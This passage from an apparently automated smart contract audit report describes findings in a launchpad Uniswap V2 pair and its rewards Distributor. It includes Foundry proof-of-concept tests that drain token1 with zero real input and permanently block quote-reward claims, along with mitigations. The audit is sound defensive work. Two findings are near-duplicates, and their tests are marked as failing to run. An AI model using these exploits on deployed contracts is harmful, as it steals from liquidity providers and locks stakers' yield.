   - `swap()` computes `amount0In = balance0 - reserve0 = A0`, `amount1In = 0` and passes the Uniswap K-invariant check as long as `y <= 997*A0*R1 / (1000*R0 + 997*A0)`.
   - This check succeeds for reasonable `y` when `A0 > 0`, so the transaction does not revert.
5. After this transaction, the attacker holds `y > 0` of token1 obtained with **no real input**, while the pool’s token1 reserves have shrunk. `accruedLaunchpadFee0` is still non-zero and can be reused in further same-block swaps.
6. A bundled MEV-style transaction can repeat step 4 multiple times to drain a large amount of token1 using the same `A0` from step 3 as virtual input, only limited by the invariant inequality. The stolen value comes at the expense of LPs and distort launchpad fee accrual.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract TestERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Minimal factory so pair.factory points to a contract that implements feeTo().
contract MockFactory {
    function feeTo() external pure returns (address) { return address(0); }

    function deployAndInit(address _token0, address _token1, address _launchpadLp, address _distributor)
        external
        returns (GTELaunchpadV2Pair pair)
    {
        pair = new GTELaunchpadV2Pair();
        // msg.sender == factory inside pair.initialize
        pair.initialize(_token0, _token1, _launchpadLp, _distributor);
    }
}

contract ZeroInputSwapExploitTest is Test {
    GTELaunchpadV2Pair pair;
    TestERC20 token0;
    TestERC20 token1;
    MockFactory factory;

    address lp = address(0x111);
    address distributor = address(0x222); // non-zero to activate launchpad accrual, but we never distribute in-block
    address trader = address(0x333);
    address attacker = address(0x444);

    function setUp() public {
        token0 = new TestERC20("T0", "T0");
        token1 = new TestERC20("T1", "T1");

        factory = new MockFactory();
        pair = factory.deployAndInit(address(token0), address(token1), lp, distributor);

        // Seed initial liquidity
        token0.mint(lp, 1_000_000 ether);
        token1.mint(lp, 1_000_000 ether);

        vm.startPrank(lp);
        token0.transfer(address(pair), 1_000_000 ether);
        token1.transfer(address(pair), 1_000_000 ether);
        pair.mint(lp);
        vm.stopPrank();

        // Trader gets token0 to create in-block accrued fees on token0 side
        token0.mint(trader, 200_000 ether);
    }

    function test_zeroInputSwap_drains_token1_with_no_token0_sent() public {
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 dx = 100_000 ether;
        uint256 amountOut = getAmountOut(dx, r0, r1); // standard 0.3% AMM formula

        // First swap: accrue launchpad fee on token0 with timeElapsed == 0
        vm.startPrank(trader);
        token0.transfer(address(pair), dx);
        pair.swap(0, amountOut, trader, new bytes(0));
        vm.stopPrank();

        (uint112 accrued0,,) = pair.getAccruedLaunchpadFees();
        assertGt(accrued0, 0, "expected accrued fee on token0");

        // Compute safe max token1 out for a zero-input swap using virtual input = accrued0
        (r0, r1, ) = pair.getReserves();
        uint256 A0 = uint256(accrued0);
        uint256 yMax = (997 * A0 * uint256(r1)) / (1000 * uint256(r0) + 997 * A0);
        require(yMax > 1, "yMax too small");
        yMax -= 1; // safety margin for rounding

        uint256 attackerBefore = token1.balanceOf(attacker);

        // Second swap: attacker sends NO token0, but withdraws token1 using virtual input counted from accrued fees
        vm.prank(attacker);
        pair.swap(0, yMax, attacker, new bytes(0));

        uint256 attackerAfter = token1.balanceOf(attacker);
        assertEq(attackerAfter - attackerBefore, yMax, "attacker did not receive expected output");

        (, uint112 r1After, ) = pair.getReserves();
        assertLt(r1After, r1, "reserve1 should decrease");
    }

    function getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}


## Suggested Mitigation
Ensure previously accrued launchpad fees are excluded from the balances used to compute amount0In/amount1In and from the K-invariant check inside swap(). Concretely:
- Before computing amountIn, derive fee-free balances:
  bal0NoFees = balance0 - accruedLaunchpadFee0;
  bal1NoFees = balance1 - accruedLaunchpadFee1;
- Compute amount0In/amount1In from balNoFees against _reserve{0,1}:
  amount0In = bal0NoFees > _reserve0 - amount0Out ? bal0NoFees - (_reserve0 - amount0Out) : 0;
  amount1In = bal1NoFees > _reserve1 - amount1Out ? bal1NoFees - (_reserve1 - amount1Out) : 0;
- Use balNoFees in the adjusted-balance K-check:
  balance0Adjusted = bal0NoFees * 1000 - amount0In * 3;
  balance1Adjusted = bal1NoFees * 1000 - amount1In * 3;
- Pass the true fresh inputs (amount0In/amount1In computed above) into _getLaunchpadFees so fees are only taken on genuine swap volume.
As an alternative design, immediately transfer/distribute launchpad fees out of the pair (or hold them in a separate contract) so the pair’s on-chain balances always match reserves plus known external holdings, keeping Uniswap V2 assumptions intact.





 **Derived From** : In addRewards(token0, token1, amount0, amount1), whichever token is selected as the base asset for the reward pool (the one whose RewardsTrackerStorage.getRewardPool(token).quoteAsset != address(0)) must have its stored quoteAsset equal to the other token argument; i.e., if getRewardPool(token0).quoteAsset != 0, it must equal token1, and if getRewardPool(token0).quoteAsset == 0 and getRewardPool(token1).quoteAsset != 0, then getRewardPool(token1).quoteAsset must equal token0.

## [H-21]. Supplying the wrong quote token to Distributor.addRewards bricks quote-reward claiming for the entire pool

### Finding Severity Justification: Any permissionless caller can add quote rewards with a mismatched token to an existing rewards pool. This desynchronizes the pool’s internal quote reward accounting from the contract’s totalPendingRewards mapping and actual balances. Subsequent quote-reward distributions (claimRewards, increaseStake, decreaseStake) revert with ClaimAmountExceedsTotalPendingRewards, preventing all users from claiming matured quote rewards for that pool. Loss/lock of matured yield is classified as High impact.
## Derived From Pattern/Invariant
In addRewards(token0, token1, amount0, amount1), whichever token is selected as the base asset for the reward pool (the one whose RewardsTrackerStorage.getRewardPool(token).quoteAsset != address(0)) must have its stored quoteAsset equal to the other token argument; i.e., if getRewardPool(token0).quoteAsset != 0, it must equal token1, and if getRewardPool(token0).quoteAsset == 0 and getRewardPool(token1).quoteAsset != 0, then getRewardPool(token1).quoteAsset must equal token0.

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards / claimRewards / increaseStake / decreaseStake

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor.addRewards is intended to be order-agnostic: the caller can pass (launchAsset, quoteAsset) in any order as (token0, token1), and the function finds the correct reward pool based on which token has a non-zero stored `quoteAsset`.

However, after selecting the reward pool, addRewards does **not** validate that the other token argument actually matches the pool's configured quote asset. It simply trusts the caller-supplied `quoteAsset` for accounting, while `_distributeAssets` later trusts `rs.quoteAsset` when paying rewards.

Relevant code:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);

        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}
```

Note:
- The stored quote asset for the pool is `rs.quoteAsset` (set during createRewardsPair).
- addRewards *never* checks that the chosen `quoteAsset` variable equals `rs.quoteAsset`.
- `addQuoteRewards` only updates `pendingQuoteRewards` and emits an event; it does not validate the quote token address.

Later, rewards are distributed using `rs.quoteAsset` as the asset key:

```solidity
function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);

    (baseAmount, quoteAmount) = rs.claim(msg.sender);

    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];

    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    ...
}
```

Exploit scenario:
1. A legitimate pool exists for launchAsset **A** with quoteAsset **B**, i.e. `getRewardPool(A).quoteAsset == B`.
2. An attacker or misconfigured integrator calls `addRewards(A, C, 0, X)` where C != B, X > 0.
   - `rs` is taken as the pool for A (since `rs.quoteAsset != 0`).
   - `launchAsset = A`, `quoteAsset = C`, `launchAssetAmount = 0`, `quoteAssetAmount = X`.
   - `rs.addQuoteRewards(A, C, X)` increments `pendingQuoteRewards` for the **A** pool.
   - `_increaseTotalPending(C, X)` and `safeTransferFrom` pull X units of token **C** into Distributor.
3. Now the reward accounting for the A pool assumes there are X extra quote rewards to distribute, but `totalPendingRewards` and actual token balances for those rewards are in asset **C**, while the pool's `quoteAsset` remains **B**.
4. When any user later triggers distribution of quote rewards (via increaseStake, decreaseStake, or claimRewards for A):
   - RewardsTrackerLib computes a positive `quoteAmount` based on `pendingQuoteRewards` and `accQuoteRewardPerShare`.
   - Distributor._distributeAssets is called with `quote = rs.quoteAsset = B` and `quoteAmount > 0`.
   - `_decreaseTotalPending(B, quoteAmount)` sees `totalPendingRewards[B] < quoteAmount` (because the extra X units were tracked under C, not B) and reverts with `ClaimAmountExceedsTotalPendingRewards()`.

After a single such malformed addRewards call, **all future attempts to realize quote rewards for that launchAsset will revert**, effectively bricking quote-reward claiming for the pool and leaving both the legitimate B rewards and the mistakenly donated C tokens stuck in the contract.

## Impact
A permissionless caller can call addRewards with a token pair where the second token does not match the pool’s configured quote asset. This increments the pool’s pendingQuoteRewards but increases totalPendingRewards and pulls funds for the wrong token. Any subsequent action that pays quote rewards (claimRewards, or increase/decreaseStake for existing stakers) will revert with ClaimAmountExceedsTotalPendingRewards because totalPendingRewards[rs.quoteAsset] is too low. The DoS persists until someone tops up the correct quote token balance to cover the owed amounts and can be repeated indefinitely. Additionally, the mistakenly deposited wrong token is accounted under totalPendingRewards[wrongToken] and can be consumed by any other pool that uses that wrong token as its quote asset (cross-pool contamination). If no such pool exists, those tokens remain stuck (and cannot be skimmed due to accounting).

## Command to Run Test


## Proof of Concept
Using the same setup as in the previous PoC:

1. setUp() has already:
   - Created a rewards pair for (base, quote) via the LaunchpadHarness.
   - Given user U some shares in the base pool via increaseStake.
2. Now simulate a malicious/misconfigured donation with an incorrect quote token:
   - Deploy a new MockERC20 token C (wrongQuote).
   - Mint some C to the test contract and approve Distributor for it.
   - Call `distributor.addRewards(address(base), address(wrongQuote), 0, 1e18)`.
     * rs is the pool for `base` (since its quoteAsset is `quote`).
     * `addQuoteRewards` increases `pendingQuoteRewards` for the base pool by 1e18.
     * `_increaseTotalPending` and `safeTransferFrom` move 1e18 units of **wrongQuote** into Distributor and track them under `totalPendingRewards[wrongQuote]`.
3. Now have user U attempt to claim rewards for `base`:
   - `vm.prank(user)`; `distributor.claimRewards(address(base))`.
   - Inside claim, RewardsTrackerLib.update applies the 1e18 of `pendingQuoteRewards` across shares and computes a positive `quoteAmount` for U.
   - `_distributeAssets` is then called with `quote = rs.quoteAsset = quote` (the correct pool quote asset, **not** wrongQuote).
   - `_decreaseTotalPending(quote, quoteAmount)` reads `totalPendingRewards[quote]`, which is 0 (no real quote tokens were ever donated with the correct asset), and sees `currTotal < quoteAmount`.
   - The call reverts with `ClaimAmountExceedsTotalPendingRewards()`.
4. Any future attempt (by any user) to claim or realize quote rewards for this pool will hit the same revert condition, effectively bricking quote rewards for that launchAsset.

The included test contract contains `testWrongQuoteTokenBreaksQuoteRewards()` that demonstrates this exact revert.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "insufficient allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract LaunchpadHarness {
    Distributor public distributor;

    constructor(Distributor _distributor) {
        distributor = _distributor;
    }

    function createPair(address launchAsset, address quoteAsset) external {
        distributor.createRewardsPair(launchAsset, quoteAsset);
    }

    function increaseStake(address launchAsset, address account, uint96 shares) external {
        distributor.increaseStake(launchAsset, account, shares);
    }
}

contract DistributorStakeRewardsTest is Test {
    Distributor distributor;
    LaunchpadHarness launchpad;
    MockERC20 base;
    MockERC20 quote;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        launchpad = new LaunchpadHarness(distributor);
        distributor.initialize(address(launchpad));

        base = new MockERC20();
        quote = new MockERC20();

        vm.prank(address(launchpad));
        launchpad.createPair(address(base), address(quote));

        vm.prank(address(launchpad));
        launchpad.increaseStake(address(base), user, 100);
    }

    function testRewardsPaidToLaunchpadNotUser() public {
        base.mint(address(this), 10e18);
        base.approve(address(distributor), type(uint256).max);

        distributor.addRewards(address(base), address(quote), uint128(10e18), 0);

        vm.prank(address(launchpad));
        launchpad.increaseStake(address(base), user, 100);

        assertEq(base.balanceOf(user), 0, "user did not receive rewards");
        assertEq(base.balanceOf(address(launchpad)), 10e18, "launchpad received user rewards");

        (uint256 pendingBase, uint256 pendingQuote) = distributor.getPendingRewards(address(base), user);
        assertEq(pendingBase, 0, "user cannot later claim leaked rewards");
        assertEq(pendingQuote, 0);
    }

    function testWrongQuoteTokenBreaksQuoteRewards() public {
        MockERC20 wrongQuote = new MockERC20();
        wrongQuote.mint(address(this), 1e18);
        wrongQuote.approve(address(distributor), type(uint256).max);

        distributor.addRewards(address(base), address(wrongQuote), 0, uint128(1e18));

        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(base));
    }
}


## Suggested Mitigation
Validate and bind the quote asset to the configured pool asset and use rs.quoteAsset for accounting/transfers. Example:

function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    RewardPoolData storage rs0 = RewardsTrackerStorage.getRewardPool(token0);
    RewardPoolData storage rs1 = RewardsTrackerStorage.getRewardPool(token1);

    RewardPoolData storage rs;
    address launchAsset;
    uint128 baseAmt;
    uint128 quoteAmt;

    if (rs0.quoteAsset == token1 && rs0.quoteAsset != address(0)) {
        // token0 is base, token1 is the configured quote
        rs = rs0;
        launchAsset = token0;
        baseAmt = amount0;
        quoteAmt = amount1;
    } else if (rs1.quoteAsset == token0 && rs1.quoteAsset != address(0)) {
        // token1 is base, token0 is the configured quote
        rs = rs1;
        launchAsset = token1;
        baseAmt = amount1;
        quoteAmt = amount0;
    } else {
        revert RewardsDoNotExist(); // or a dedicated InvalidQuoteAsset()
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    // Always use the configured pool assets for accounting and transfers
    if (baseAmt > 0) {
        rs.addBaseRewards(launchAsset, baseAmt);
        _increaseTotalPending(launchAsset, baseAmt);
        launchAsset.safeTransferFrom(msg.sender, address(this), baseAmt);
    }
    if (quoteAmt > 0) {
        address quote = rs.quoteAsset;
        rs.addQuoteRewards(launchAsset, quote, quoteAmt);
        _increaseTotalPending(quote, quoteAmt);
        quote.safeTransferFrom(msg.sender, address(this), quoteAmt);
    }
}

At minimum, after selecting the pool (rs), require that the inferred quote token equals rs.quoteAsset and use rs.quoteAsset for both _increaseTotalPending and safeTransferFrom; otherwise revert (e.g., InvalidQuoteAsset). This prevents poisoning the pool’s quote accounting and avoids cross-pool contamination.





 **Derived From** : addRewards allows mismatched quote token, breaking reward accounting and locking tokens

## [H-22]. Permissionless addRewards with wrong quote token permanently bricks quote reward claims for a pool

### Finding Severity Justification: Permissionless misuse of addRewards lets anyone credit quote rewards for a pool using an arbitrary ERC20 that does not match the pool’s configured quote asset. This inflates accQuoteRewardPerShare without adding matching backing of the real quote asset, causing claimRewards to revert permanently (or until enough real quote is later deposited). This results in matured yield becoming unclaimable for affected stakers, which qualifies as High under the rubric (matured yield loss).
## Derived From Pattern/Invariant
addRewards allows mismatched quote token, breaking reward accounting and locking tokens

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor.addRewards identifies a rewards pool solely by whichever of token0/token1 has a non-zero quoteAsset in storage, but it does not verify that the *other* token passed in matches the pool's configured quote asset. It then:
- credits pendingQuoteRewards for the pool without tying it to any particular ERC20 address, and
- credits totalPendingRewards[quoteAsset] using the arbitrary token address supplied to addRewards, and
- transfers that arbitrary token into the Distributor.

Later, when users claim or when shares are adjusted, Distributor always uses rs.quoteAsset (the configured quote asset from createRewardsPair) as the token to pay out and to decrement totalPendingRewards. This leads to an accounting mismatch if addRewards was called with a different quote token.

Relevant code (simplified):
"function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) = (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}"

Distribution always uses rs.quoteAsset, *ignoring* the quoteAsset argument used in addRewards:
"function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.claim(msg.sender);
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}"

Attack:
- A malicious actor calls addRewards with (launchAsset, FakeToken, 0, fakeAmount), where FakeToken != rs.quoteAsset. The pool for launchAsset already exists and has totalShares > 0, so the call succeeds.
- This increments self.pendingQuoteRewards by fakeAmount and totalPendingRewards[FakeToken] by fakeAmount, and transfers fakeAmount FakeTokens into the contract.
- On the next claimRewards(launchAsset) or stake/unstake, RewardsTrackerLib.update() folds pendingQuoteRewards (including fakeAmount) into accQuoteRewardPerShare, and zeros pendingQuoteRewards.
- The user-specific quoteAmount computed from accQuoteRewardPerShare is as if realQuote rewards had been added, but Distributor._distributeAssets now tries to pay that amount using rs.quoteAsset (realQuote) and decrements totalPendingRewards[realQuote]. totalPendingRewards[realQuote] was never increased by the fake deposit, so for sufficiently large fakeAmount, _decreaseTotalPending(rs.quoteAsset, quoteAmount) sees currTotal < quoteAmount and reverts with ClaimAmountExceedsTotalPendingRewards().

Since RewardsTrackerLib.claim's state changes (rewardDebt updates) are reverted together with the revert, users remain with non-zero pendingQuoteRewards derived from the poisoned index but cannot claim them. Any subsequent real deposits of the correct quote asset merely increase both obligations and backing equally, so the gap created by the fake deposit persists. The pool's quote rewards become permanently unclaimable, and the fake tokens are stuck under totalPendingRewards[FakeToken] and cannot be skimmed.

## Impact
An attacker can permanently brick quote reward claims for any launch asset pool by donating rewards in an arbitrary ERC20 instead of the configured quote asset. All legitimate quote rewards for that pool become unclaimable, and both user yield and the protocol’s reward distribution guarantees are broken.

## Command to Run Test


## Proof of Concept
1. A pool is created for (launchAsset = A, quoteAsset = B) via createRewardsPair(A, B). totalShares > 0 because some users are staked.
2. Attacker deploys a worthless ERC20 token C and calls addRewards(A, C, 0, X) with X > 0:
   - rs = getRewardPool(A) (already initialized), rs.totalShares > 0, so call proceeds.
   - rs.addQuoteRewards(A, C, X) increases pendingQuoteRewards by X (implicitly treating them as B-denominated).
   - _increaseTotalPending(C, X) and C.safeTransferFrom(...) move X units of C into Distributor and record them under totalPendingRewards[C].
3. On the next call to claimRewards(A) (or increaseStake/decreaseStake), RewardsTrackerLib.update() applies pendingQuoteRewards to accQuoteRewardPerShare and zeros pendingQuoteRewards.
4. For a staker U with shares > 0, RewardsTrackerLib.claim computes a positive quoteAmount as if X units of B had been deposited.
5. Distributor._distributeAssets is invoked with quote = rs.quoteAsset = B and quoteAmount > 0. It calls _decreaseTotalPending(B, quoteAmount), but totalPendingRewards[B] only reflects real B deposits (possibly 0), so currTotal < quoteAmount and the call reverts with ClaimAmountExceedsTotalPendingRewards().
6. The entire claim transaction reverts, leaving U unable to claim any of their (legitimate) B rewards. This DoS persists across future claims and even after additional legitimate B deposits, because the fake C deposit permanently increased the reward index without adding B backing.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract DistributorAddRewardsWrongQuoteTest is Test {
    Distributor distributor;
    MockERC20 launch;
    MockERC20 realQuote;
    MockERC20 fakeQuote;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // this contract is launchpad
        launch = new MockERC20("Launch", "L");
        realQuote = new MockERC20("RealQuote", "RQ");
        fakeQuote = new MockERC20("Fake", "F");

        // configure pool A/B
        distributor.createRewardsPair(address(launch), address(realQuote));

        // give user 1 share so totalShares > 0
        distributor.increaseStake(address(launch), user, 1);

        // fund attacker with fakeQuote and approve distributor
        fakeQuote.mint(address(this), 100 ether);
        fakeQuote.approve(address(distributor), type(uint256).max);
    }

    function testWrongQuoteTokenBricksClaims() public {
        // attacker donates rewards in wrong quote token C instead of realQuote
        distributor.addRewards(address(launch), address(fakeQuote), 0, 100 ether);

        // tracker reports non-zero pending quote rewards for user
        (, uint256 pendingQuote) = distributor.getPendingRewards(address(launch), user);
        assertGt(pendingQuote, 0);

        // claiming now reverts because Distributor tries to pay using realQuote with no matching totalPendingRewards
        vm.startPrank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(launch));
        vm.stopPrank();
    }
}


## Suggested Mitigation
Enforce that the quote token used in addRewards matches the pool configuration, and always key totalPendingRewards by the configured assets, not by arbitrary user input. For example:
- After determining rs (the pool) and launchAsset via token0/token1, require that the other token equals rs.quoteAsset when quoteAssetAmount > 0:
  require(otherToken == rs.quoteAsset, "Invalid quote token");
- In the quote reward branch, call _increaseTotalPending(rs.quoteAsset, quoteAssetAmount) and quoteAsset.safeTransferFrom(msg.sender, address(this), quoteAssetAmount) where quoteAsset is fixed to rs.quoteAsset rather than taken from the function parameters.

This ensures that only the correct quote asset can ever be deposited for a given pool and that per-pool reward indices and global totalPendingRewards remain consistent.



